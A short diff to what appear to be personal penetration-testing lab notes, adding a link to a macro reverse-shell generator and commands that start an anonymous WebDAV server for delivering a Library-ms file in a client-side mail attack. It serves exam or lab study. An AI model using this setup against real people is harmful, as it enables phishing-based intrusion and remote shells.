@@ -61,6 +61,10 @@ file metadata analyzer:
 
 Client side attack through mail with library using webdav:
 
+    macros:
+        https://github.com/glowbase/macro_reverse_shell/blob/main/generate.py
+
+    library:
     mkdir /home/shaleph/offsec/relia/webdav
     /home/shaleph/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/shaleph/offsec/relia/webdav/
     make config.Library-ms file in visual code studio with code inside:
